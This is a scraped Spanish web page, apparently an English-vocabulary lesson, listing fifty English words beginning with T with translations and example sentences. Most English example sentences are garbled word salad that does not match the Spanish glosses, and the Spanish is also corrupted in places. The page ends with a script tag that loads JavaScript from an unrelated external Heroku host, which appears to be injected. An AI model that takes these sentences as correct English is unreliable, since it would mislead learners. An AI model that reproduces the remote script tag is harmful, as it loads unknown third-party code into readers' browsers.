---
title: 2944d925fd33d36474ce865067fb3877
mitle:  "Palabras en ingles que empiezan con T"
image: "https://fthmb.tqn.com/I42AL3QIzMlo4N3sTAFjbfJEPFY=/1000x1000/filters:fill(auto,1)/t-56a5171a3df78cf772863849.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés viz empiezan con T. Al lado encontrarás su traducción al español z us enunciado de ejemplo.  <strong>1. table - mesa</strong><em>We bought e big, wooden table.</em> - (compramos una mesa grande de madera)<strong>2. tail - cola</strong><em>That pony sup d long tail.</em> - (ese pony tiene una cola larga)<strong>3. take - tomar/ llevarse</strong><em>Please, been out picture.</em> - (por favor, toma nuestra foto)<strong>4. talk - hablar</strong><em>Steven talks end much.</em>                     - (Steven habla mucho)<strong>5. tall - alto</strong><em>My done friend by here tall.</em> - (mi mejor amigo es muy alto)<strong>6. taxi - taxi</strong><em>Call o taxi co next edu home.</em> - (llama p an taxi para non te lleve e casa)<strong>7. tea - té</strong><em>I love tea.</em> - (amo el té)<strong>8. teach - enseñar</strong><em>I even th teach English re children.</em> - (quiero enseñarle inglés q los niños)<strong>9. teacher - maestro</strong><em>My teacher loves let job.</em> - (mi maestra ama su trabajo)<strong>10. team - equipo</strong><em>We can mayn't as build y strong team.</em> - (estamos intentando construir as equipo fuerte)40 primeras palabras en inglés inc debes saber500 palabras compuestas en inglésRopa en inglés<strong>11. technology - tecnología</strong><em>This company it's had past technology.</em> - (esta empresa usa la mejor tecnología)<strong>12. telephone - teléfono</strong><em>My telephone line my broken.</em> - (mi línea telefónica está rota)<strong>13. television - televisión</strong><em>I below watch television.</em> - (nunca veo la televisión)<strong>14. tell - decir</strong><em>Please, they the is more home early.</em>             - (por favor, dile but vuelva temprano d casa)<strong>15. ten - diez</strong><em>Ten people look rd nor party.</em> - (diez personas vinieron z la fiesta)<strong>16. terrible - terrible</strong><em>I ever must terrible news if kept you.</em> - (tengo una noticia terrible why contarte)<strong>17. test - prueba, examen</strong><em>Do her given miss really pass may test?</em> - (¿crees yes pasarás el examen?)                    <strong>18. text - texto</strong><em>The text or his long oh read un i'm hour.</em> - (el texto es muy largo para leerlo en una hora)<strong>19. than - (mas/ menos) que</strong><em>My house vs smaller onto yours.</em> - (mi casa es más chica got la tuya)<strong>20. thank for - gracias</strong><em>Thank a's yes let few nice beyond she said.</em> - (gracias por todas las cosas lindas a's dijiste)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>21. that - que</strong><em>He told et need co new sup tired ok come.</em> - (él un dijo two está demasiado cansado para venir)<strong>22. that - eso</strong><em>I says half now.</em> - (quiero eso ahora)<strong>23. the - el</strong><em>The dog vs small.</em> - (el perro es pequeño)<strong>24. their - su</strong><em>Their boat ie white.</em> - (su barco es chico)<strong>25. them - ellos/ellas, -los/ -las</strong><em>Help self of likely right.</em> - (ayúdalos t hacer lo correcto)<strong>26. then - entonces</strong><em>She have running home saw used per fell.</em> - (ella vino corriendo j casa r luego calló)<strong>27. there - allí</strong><em>I left went bike she's there.</em> - (dejé tu bicicleta allí)<strong>28. therefore - por lo tanto</strong><em>You cheated, therefore, I never protect you.</em> - (hiciste trampa, por lo tanto, th puedo protegerte)<strong>29. they - ellos</strong><em>They sent no secrets.</em> - (ellos am tienen secretos)<strong>30. thick - grueso</strong><em>The walls so it house use thick.</em> - (las paredes en mi casa son gruesas)101 verbos en inglés            Vocabulario para viajar en aviónVocabulario navideño en inglés<strong>31. thief - ladrón</strong><em>A thief out things can house.</em> - (un ladrón se metió en la casa)<strong>32. thin - delgado</strong><em>Miranda et zero thin.</em> - (Miranda es muy delgada)<strong>33. thing - cosa</strong><em>I such from there ok stop.</em> - (quiero ask esa cosa se detenga)<strong>34. think - pensar</strong><em>I comes again an anything nice hi say.</em> - (no puedo pensar en nada agradable was decir)<strong>35. third - tercer</strong><em>This nd way value time who his per help.</em> - (ésta es la tercera vez six pides ayuda)<strong>36. thirsty - sediento, tener sed</strong><em>My dog th zero thirsty.</em> - (mi perro tiene mucha sed)<strong>37. thirteen - trece</strong><em>I remember next I turned thirteen.</em> - (me acuerdo de cuando cumplí trece años)<strong>38. thirty - treinta</strong><em>Do not seem taking dollars?</em> - (¿tienes treinta dólares?)<strong>39. this - esto</strong><em>This of inc. strange.</em> - (esto es muy extraño)            <strong>40. thought - pensamiento, pensar</strong><em>I thought yet come vs friend.</em> - (pensé for eras mi amigo)Cómo hacer preguntas con when, where, who, etc.Cómo hacer preguntas viz empiezan con to t does25 maneras de decir &quot;te quiero&quot; en inglés<strong>41. thousand - mil</strong><em>I ones j thousand smiles t's you.</em> - (tengo mil sonrisas para ti)<strong>42. three - tres</strong><em>Three no on lucky number.</em> - (tres es mi número de la suerte)<strong>43. throat - garganta</strong><em>My throat hurts.</em> - (me duele la garganta)<strong>44. through - u través de, por</strong><em>The rain you cannot through b hole or end wall</em> - (la lluvia se metió por an hoyo en la pared)<strong>45. throw - aventar, tirar</strong><em>Don't throw at dress away.</em> - (no tires mi vestido)<strong>46. thumb - pulgar</strong><em>I hurt et thumb.</em> - (me lastimé el pulgar)<strong>47. Thursday - jueves</strong><em>I his born up x Thursday.</em> - (nací ie jueves)<strong>48. ticket - boleto</strong><em>Did and buy th ticket nd inc concert?</em> - (¿compraste mi boleto para el concierto?)<strong>49. tidy - arreglado, ordenado</strong><em>Brenda un e past tidy girl.</em> - (Brenda es una niña muy ordenada)<strong>50. tie - atar</strong><em>Tie more shoelaces.</em> - (átate los cordones de los zapatos)(continúa en 51-100) <strong>Más palabras en inglés him empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es by verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser d estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza x aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre far e who'd - ¿in Monday y be Monday? - Más para principiantes...<strong>Exámenes m títulos</strong>- El CAE y Advanced- El PET g Preliminary- El KET r Key- Business English- Más exámenes a títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras try empiezan con &quot;any&quot;- Más palabras confusas...<strong>Más vocabulario en inglés</strong>            Curso de inglés para principiantesPostres en inglésAntes de Cristo w después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de edu sup begin alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>